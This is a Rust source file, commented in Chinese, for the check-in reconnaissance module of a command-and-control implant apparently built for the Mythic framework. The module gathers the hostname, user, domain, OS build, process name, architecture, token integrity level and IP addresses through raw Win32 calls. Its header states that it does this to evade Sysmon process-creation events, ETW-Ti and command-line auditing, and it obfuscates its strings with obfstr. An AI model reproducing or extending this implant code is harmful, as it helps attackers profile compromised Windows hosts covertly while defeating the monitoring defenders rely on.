//! # Windows 原生系统遥测与上线元数据采集模块 (Zero-Heap Native SysInfo)
//!
//! ## 核心设计哲学与 Windows 10/11 规避对抗 (OPSEC)
//!
//! 1. **严禁派生子进程 (No Child Process / No CMD / No PowerShell)**：
//!    - 传统上线信息采集常依赖 `whoami`、`hostname`、`ipconfig` 等外部控制台程序，
//!      在 Windows 10/11 上会直接触发 Sysmon Event ID 1（进程创建）、ETW-Ti 及命令行审计告警。
//!    - 本模块 100% 采用原生 Win32 C-ABI 叶子接口（`kernel32` / `advapi32`），规避进程树异动与可疑父子进程链特征。
//! 2. **100% 纯栈零堆分配 (Zero-Heap Workspace Pattern)**：
//!    - 调用者在栈上提供定长工作面 [`SysInfoWorkspace`]，所有字符串就地写入栈数组；
//!    - 对外仅导出借用切片结构体 [`SysInfoSnapshot<'a>`]，无任何 `String` 或 `Vec` 分配。
//! 3. **精准评估 Windows 访问令牌完整性级别 (Token Integrity Level)**：
//!    - 通过进程 Token 评估 RID（Low: 0x1000, Medium: 0x2000, High: 0x3000, System: 0x4000），
//!      严密映射为 Mythic 4.0 官方数字标准（1: Low, 2: Medium, 3: High, 4: SYSTEM）。

use crate::error::AgentError;

/// 系统信息采集定长纯栈暂存工作区 (Zero-Heap Stack Workspace)
pub struct SysInfoWorkspace {
    host_buf: [u8; 128],
    host_len: usize,
    user_buf: [u8; 128],
    user_len: usize,
    domain_buf: [u8; 128],
    domain_len: usize,
    os_buf: [u8; 64],
    os_len: usize,
    proc_buf: [u8; 128],
    proc_len: usize,
    ip_buf: [[u8; 16]; 4],
    ip_lens: [usize; 4],
    ip_slice_storage: [&'static str; 4],
    ip_count: usize,
}

impl Default for SysInfoWorkspace {
    fn default() -> Self {
        Self::new()
    }
}

impl SysInfoWorkspace {
    /// 初始化纯栈工作区
    pub const fn new() -> Self {
        Self {
            host_buf: [0u8; 128],
            host_len: 0,
            user_buf: [0u8; 128],
            user_len: 0,
            domain_buf: [0u8; 128],
            domain_len: 0,
            os_buf: [0u8; 64],
            os_len: 0,
            proc_buf: [0u8; 128],
            proc_len: 0,
            ip_buf: [[0u8; 16]; 4],
            ip_lens: [0usize; 4],
            ip_slice_storage: ["127.0.0.1", "", "", ""],
            ip_count: 1,
        }
    }
}

/// 采集完成的系统元数据不可变快照 (仅包含栈借用切片)
#[derive(Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct SysInfoSnapshot<'a> {
    pub host: &'a str,
    pub user: &'a str,
    pub domain: &'a str,
    pub os: &'a str,
    pub process_name: &'a str,
    pub architecture: &'static str,
    pub pid: u32,
    pub integrity_level: u8,
    pub ips: &'a [&'a str],
}

impl SysInfoWorkspace {
    /// 执行就地环境信息采集并返回生命周期受限的不可变快照切片
    #[inline(never)]
    pub fn collect(&mut self) -> Result<SysInfoSnapshot<'_>, AgentError> {
        #[cfg(windows)]
        {
            self.collect_windows()
        }

        #[cfg(not(windows))]
        {
            self.collect_fallback()
        }
    }

    #[cfg(windows)]
    fn collect_windows(&mut self) -> Result<SysInfoSnapshot<'_>, AgentError> {
        // 1. 获取 PID
        let pid = unsafe { win32::GetCurrentProcessId() };

        // 2. 获取计算机名 (Host)
        let mut host_size = (self.host_buf.len() - 1) as u32;
        let host_ok = unsafe {
            win32::GetComputerNameA(self.host_buf.as_mut_ptr() as *mut i8, &mut host_size)
        };
        if host_ok != 0 && host_size > 0 {
            self.host_len = host_size as usize;
        } else {
            obfstr::obfstr!(let def = "WINDOWS-HOST";);
            self.host_buf[..def.len()].copy_from_slice(def.as_bytes());
            self.host_len = def.len();
        }

        // 3. 获取当前用户名 (User)
        let mut user_size = (self.user_buf.len() - 1) as u32;
        let user_ok = unsafe {
            win32::GetUserNameA(self.user_buf.as_mut_ptr() as *mut i8, &mut user_size)
        };
        if user_ok != 0 && user_size > 1 {
            // GetUserNameA 包含结尾的 null 终止符，大小计数包括 null
            self.user_len = (user_size - 1) as usize;
        } else {
            obfstr::obfstr!(let def = "SYSTEM";);
            self.user_buf[..def.len()].copy_from_slice(def.as_bytes());
            self.user_len = def.len();
        }

        // 4. 获取域名 / 工作组 (Domain: 优先尝试 Active Directory DNS 域名，失败则回退 WORKGROUP)
        let mut domain_size = (self.domain_buf.len() - 1) as u32;
        let domain_ok = unsafe {
            win32::GetComputerNameExA(
                win32::ComputerNameDnsDomain,
                self.domain_buf.as_mut_ptr() as *mut i8,
                &mut domain_size,
            )
        };
        if domain_ok != 0 && domain_size > 0 {
            self.domain_len = domain_size as usize;
        } else {
            obfstr::obfstr!(let domain_str = "WORKGROUP";);
            self.domain_buf[..domain_str.len()].copy_from_slice(domain_str.as_bytes());
            self.domain_len = domain_str.len();
        }

        // 5. 获取操作系统描述 (OS: 原生 RtlGetVersion 获取真实内核版本与 Windows 10/11 构建号)
        let mut osvi = core::mem::MaybeUninit::<win32::OSVERSIONINFOEXW>::uninit();
        let os_ok = unsafe {
            core::ptr::write_bytes(
                osvi.as_mut_ptr() as *mut u8,
                0,
                core::mem::size_of::<win32::OSVERSIONINFOEXW>(),
            );
            (*osvi.as_mut_ptr()).dwOSVersionInfoSize =
                core::mem::size_of::<win32::OSVERSIONINFOEXW>() as u32;
            win32::RtlGetVersion(osvi.as_mut_ptr()) == 0
        };

        if os_ok {
            let info = unsafe { osvi.assume_init() };
            let major = info.dwMajorVersion;
            let build = info.dwBuildNumber;
            let mut offset;
            obfstr::obfstr! {
                let win11 = "Windows 11 (Build ";
                let win10 = "Windows 10 (Build ";
                let win_nt = "Windows NT ";
            }
            if major == 10 {
                // Windows 11 (Build >= 22000), Windows 10 (Build < 22000)
                let name = if build >= 22000 { win11 } else { win10 };
                self.os_buf[..name.len()].copy_from_slice(name.as_bytes());
                offset = name.len();
                offset += format_u32(&mut self.os_buf[offset..], build);
                if offset < self.os_buf.len() {
                    self.os_buf[offset] = b')';
                    offset += 1;
                }
            } else {
                self.os_buf[..win_nt.len()].copy_from_slice(win_nt.as_bytes());
                offset = win_nt.len();
                offset += format_u32(&mut self.os_buf[offset..], major);
                if offset < self.os_buf.len() {
                    self.os_buf[offset] = b'.';
                    offset += 1;
                }
                offset += format_u32(&mut self.os_buf[offset..], info.dwMinorVersion);
            }
            self.os_len = offset;
        } else {
            obfstr::obfstr!(let os_str = "Windows 11";);
            self.os_buf[..os_str.len()].copy_from_slice(os_str.as_bytes());
            self.os_len = os_str.len();
        }

        // 6. 获取当前进程映像名称 (Process Name)
        let mut full_path_buf = [0u8; 260];
        let path_len = unsafe {
            win32::GetModuleFileNameA(
                core::ptr::null_mut(),
                full_path_buf.as_mut_ptr() as *mut i8,
                full_path_buf.len() as u32,
            )
        };
        if path_len > 0 {
            let full_path = core::str::from_utf8(&full_path_buf[..path_len as usize])
                .unwrap_or("");
            let file_name = full_path
                .rsplit('\\')
                .next()
                .or_else(|| full_path.rsplit('/').next())
                .unwrap_or("wisconsin.exe");
            self.proc_buf[..file_name.len()].copy_from_slice(file_name.as_bytes());
            self.proc_len = file_name.len();
        } else {
            obfstr::obfstr!(let def = "wisconsin.exe";);
            self.proc_buf[..def.len()].copy_from_slice(def.as_bytes());
            self.proc_len = def.len();
        }

        // 7. 评估系统架构 (Architecture)
        let arch = unsafe {
            let mut sys_info = core::mem::MaybeUninit::<win32::SYSTEM_INFO>::uninit();
            win32::GetNativeSystemInfo(sys_info.as_mut_ptr());
            let info = sys_info.assume_init();
            match info.wProcessorArchitecture {
                9 => "x64",
                12 => "arm64",
                0 => "x86",
                _ => "x64",
            }
        };

        // 8. 评估进程 Token 完整性级别 (Integrity Level)
        let integrity_level = Self::query_integrity_level();

        // 9. IP 地址 (零堆原生网络适配器枚举)
        let mut table_buf = [0u8; 512];
        let mut table_size = table_buf.len() as u32;
        let ret = unsafe {
            win32::GetIpAddrTable(
                table_buf.as_mut_ptr() as *mut core::ffi::c_void,
                &mut table_size,
                0,
            )
        };

        let mut found = 0;
        if ret == 0 && table_size >= 4 {
            let num_entries = unsafe { *(table_buf.as_ptr() as *const u32) };
            let rows = unsafe {
                core::slice::from_raw_parts(
                    table_buf.as_ptr().add(4) as *const win32::MIB_IPADDRROW,
                    num_entries as usize,
                )
            };

            for row in rows {
                let addr = row.dwAddr;
                if addr == 0 {
                    continue;
                }
                let b0 = (addr & 0xFF) as u8;
                let b1 = ((addr >> 8) & 0xFF) as u8;
                let b2 = ((addr >> 16) & 0xFF) as u8;
                let b3 = ((addr >> 24) & 0xFF) as u8;

                // 优先过滤掉 127.0.0.1 环回
                if b0 == 127 {
                    continue;
                }

                if found < 4 {
                    let len = format_ipv4(&mut self.ip_buf[found], b0, b1, b2, b3);
                    self.ip_lens[found] = len;
                    let s = unsafe {
                        core::str::from_utf8_unchecked(&self.ip_buf[found][..len])
                    };
                    self.ip_slice_storage[found] = unsafe { core::mem::transmute::<&str, &'static str>(s) };
                    found += 1;
                }
            }
        }

        if found == 0 {
            obfstr::obfstr!(let loopback = "127.0.0.1";);
            self.ip_buf[0][..loopback.len()].copy_from_slice(loopback.as_bytes());
            self.ip_lens[0] = loopback.len();
            self.ip_slice_storage[0] = "127.0.0.1";
            found = 1;
        }
        self.ip_count = found;

        let host = core::str::from_utf8(&self.host_buf[..self.host_len])
            .map_err(|_| AgentError::SysinfoFailed)?;
        let user = core::str::from_utf8(&self.user_buf[..self.user_len])
            .map_err(|_| AgentError::SysinfoFailed)?;
        let domain = core::str::from_utf8(&self.domain_buf[..self.domain_len])
            .map_err(|_| AgentError::SysinfoFailed)?;
        let os = core::str::from_utf8(&self.os_buf[..self.os_len])
            .map_err(|_| AgentError::SysinfoFailed)?;
        let process_name = core::str::from_utf8(&self.proc_buf[..self.proc_len])
            .map_err(|_| AgentError::SysinfoFailed)?;

        Ok(SysInfoSnapshot {
            host,
            user,
            domain,
            os,
            process_name,
            architecture: arch,
            pid,
            integrity_level,
            ips: &self.ip_slice_storage[..self.ip_count],
        })
    }

    #[cfg(windows)]
    fn query_integrity_level() -> u8 {
        unsafe {
            let mut token_handle = core::ptr::null_mut();
            let current_proc = win32::GetCurrentProcess();
            if win32::OpenProcessToken(current_proc, win32::TOKEN_QUERY, &mut token_handle) == 0 {
                return 2; // 默认 Medium Integrity
            }

            #[repr(C, align(8))]
            struct AlignedLabelBuf {
                data: [u8; 128],
            }

            let mut token_label_buf = AlignedLabelBuf { data: [0u8; 128] };
            let mut return_length = 0u32;
            let success = win32::GetTokenInformation(
                token_handle,
                win32::TOKEN_INTEGRITY_LEVEL,
                token_label_buf.data.as_mut_ptr() as *mut core::ffi::c_void,
                token_label_buf.data.len() as u32,
                &mut return_length,
            );

            win32::CloseHandle(token_handle);

            if success == 0 {
                return 2;
            }

            let mandatory_label = core::ptr::read_unaligned(
                token_label_buf.data.as_ptr() as *const win32::TOKEN_MANDATORY_LABEL,
            );
            let sid = mandatory_label.Label.Sid;
            if sid.is_null() {
                return 2;
            }

            let sub_auth_count_ptr = win32::GetSidSubAuthorityCount(sid);
            if sub_auth_count_ptr.is_null() {
                return 2;
            }
            let sub_auth_count = *sub_auth_count_ptr;
            if sub_auth_count == 0 {
                return 2;
            }

            let rid_ptr = win32::GetSidSubAuthority(sid, (sub_auth_count - 1) as u32);
            if rid_ptr.is_null() {
                return 2;
            }
            let rid = *rid_ptr;

            // 映射 Windows RID 到 Mythic 标准:
            // 1: Low (< 0x2000)
            // 2: Medium (0x2000 ~ 0x2FFF)
            // 3: High (0x3000 ~ 0x3FFF)
            // 4: SYSTEM (>= 0x4000)
            if rid >= 0x4000 {
                4
            } else if rid >= 0x3000 {
                3
            } else if rid >= 0x2000 {
                2
            } else {
                1
            }
        }
    }

    #[cfg(not(windows))]
    fn collect_fallback(&mut self) -> Result<SysInfoSnapshot<'_>, AgentError> {
        let def_host = "MOCK-HOST";
        let def_user = "test-user";
        let def_domain = "WORKGROUP";
        let def_os = "Windows 11 Mock";
        let def_proc = "mock_agent.exe";

        self.host_buf[..def_host.len()].copy_from_slice(def_host.as_bytes());
        self.host_len = def_host.len();
        self.user_buf[..def_user.len()].copy_from_slice(def_user.as_bytes());
        self.user_len = def_user.len();
        self.domain_buf[..def_domain.len()].copy_from_slice(def_domain.as_bytes());
        self.domain_len = def_domain.len();
        self.os_buf[..def_os.len()].copy_from_slice(def_os.as_bytes());
        self.os_len = def_os.len();
        self.proc_buf[..def_proc.len()].copy_from_slice(def_proc.as_bytes());
        self.proc_len = def_proc.len();

        self.ip_slice_storage[0] = "127.0.0.1";
        self.ip_count = 1;

        Ok(SysInfoSnapshot {
            host: def_host,
            user: def_user,
            domain: def_domain,
            os: def_os,
            process_name: def_proc,
            architecture: "x64",
            pid: 1337,
            integrity_level: 3,
            ips: &self.ip_slice_storage[..self.ip_count],
        })
    }
}

#[inline]
fn format_u32(dst: &mut [u8], mut val: u32) -> usize {
    if val == 0 {
        if !dst.is_empty() {
            dst[0] = b'0';
            return 1;
        }
        return 0;
    }
    let mut temp = [0u8; 10];
    let mut count = 0;
    while val > 0 && count < 10 {
        temp[count] = b'0' + (val % 10) as u8;
        val /= 10;
        count += 1;
    }
    let mut written = 0;
    for i in (0..count).rev() {
        if written < dst.len() {
            dst[written] = temp[i];
            written += 1;
        }
    }
    written
}

#[inline]
fn format_ipv4(dst: &mut [u8; 16], b0: u8, b1: u8, b2: u8, b3: u8) -> usize {
    let mut idx = 0;
    let bytes = [b0, b1, b2, b3];
    for (i, &b) in bytes.iter().enumerate() {
        idx += format_u32(&mut dst[idx..], b as u32);
        if i < 3 && idx < dst.len() {
            dst[idx] = b'.';
            idx += 1;
        }
    }
    idx
}

// ==========================================
// Windows 原生 Win32 API 动态符号链接
// ==========================================

#[cfg(windows)]
#[allow(non_snake_case, non_upper_case_globals, clippy::upper_case_acronyms)]
mod win32 {
    pub type HANDLE = *mut core::ffi::c_void;
    pub type BOOL = i32;
    pub const TOKEN_QUERY: u32 = 0x0008;
    pub const TOKEN_INTEGRITY_LEVEL: i32 = 25;
    pub const ComputerNameDnsDomain: i32 = 2;

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct SID_AND_ATTRIBUTES {
        pub Sid: *mut core::ffi::c_void,
        pub Attributes: u32,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct TOKEN_MANDATORY_LABEL {
        pub Label: SID_AND_ATTRIBUTES,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct SYSTEM_INFO {
        pub wProcessorArchitecture: u16,
        pub wReserved: u16,
        pub dwPageSize: u32,
        pub lpMinimumApplicationAddress: *mut core::ffi::c_void,
        pub lpMaximumApplicationAddress: *mut core::ffi::c_void,
        pub dwActiveProcessorMask: usize,
        pub dwNumberOfProcessors: u32,
        pub dwProcessorType: u32,
        pub dwAllocationGranularity: u32,
        pub wProcessorLevel: u16,
        pub wProcessorRevision: u16,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct OSVERSIONINFOEXW {
        pub dwOSVersionInfoSize: u32,
        pub dwMajorVersion: u32,
        pub dwMinorVersion: u32,
        pub dwBuildNumber: u32,
        pub dwPlatformId: u32,
        pub szCSDVersion: [u16; 128],
        pub wServicePackMajor: u16,
        pub wServicePackMinor: u16,
        pub wSuiteMask: u16,
        pub wProductType: u8,
        pub wReserved: u8,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct MIB_IPADDRROW {
        pub dwAddr: u32,
        pub dwIndex: u32,
        pub dwMask: u32,
        pub dwBCastAddr: u32,
        pub dwReasmSize: u32,
        pub unused1: u16,
        pub wType: u16,
    }

    #[link(name = "kernel32")]
    unsafe extern "system" {
        pub fn GetCurrentProcess() -> HANDLE;
        pub fn GetCurrentProcessId() -> u32;
        pub fn GetComputerNameA(lpBuffer: *mut i8, nSize: *mut u32) -> BOOL;
        pub fn GetComputerNameExA(NameType: i32, lpBuffer: *mut i8, nSize: *mut u32) -> BOOL;
        pub fn GetModuleFileNameA(hModule: *mut core::ffi::c_void, lpFilename: *mut i8, nSize: u32) -> u32;
        pub fn GetNativeSystemInfo(lpSystemInfo: *mut SYSTEM_INFO);
        pub fn CloseHandle(hObject: HANDLE) -> BOOL;
    }

    #[link(name = "advapi32")]
    unsafe extern "system" {
        pub fn GetUserNameA(lpBuffer: *mut i8, pcbBuffer: *mut u32) -> BOOL;
        pub fn OpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: u32, TokenHandle: *mut HANDLE) -> BOOL;
        pub fn GetTokenInformation(
            TokenHandle: HANDLE,
            TokenInformationClass: i32,
            TokenInformation: *mut core::ffi::c_void,
            TokenInformationLength: u32,
            ReturnLength: *mut u32,
        ) -> BOOL;
        pub fn GetSidSubAuthorityCount(pSid: *mut core::ffi::c_void) -> *mut u8;
        pub fn GetSidSubAuthority(pSid: *mut core::ffi::c_void, nSubAuthority: u32) -> *mut u32;
    }

    #[link(name = "ntdll")]
    unsafe extern "system" {
        pub fn RtlGetVersion(lpVersionInformation: *mut OSVERSIONINFOEXW) -> i32;
    }

    #[link(name = "iphlpapi")]
    unsafe extern "system" {
        pub fn GetIpAddrTable(
            pIpAddrTable: *mut core::ffi::c_void,
            pdwSize: *mut u32,
            bOrder: BOOL,
        ) -> u32;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sysinfo_collection_zero_heap() {
        let mut ws = SysInfoWorkspace::new();
        let info = ws.collect().expect("collect sysinfo");

        assert!(!info.host.is_empty(), "host 不得为空");
        assert!(!info.user.is_empty(), "user 不得为空");
        assert!(!info.domain.is_empty(), "domain 不得为空");
        assert!(!info.os.is_empty(), "os 不得为空");
        assert!(!info.process_name.is_empty(), "process_name 不得为空");
        assert!(info.pid > 0, "pid 必须大于 0");
        assert!(info.integrity_level >= 1 && info.integrity_level <= 4, "完整性级别必须在 1~4 范围");
        assert!(!info.ips.is_empty(), "ips 不得为空");
        assert!(!info.ips[0].is_empty(), "ip 不得为空");
    }
}
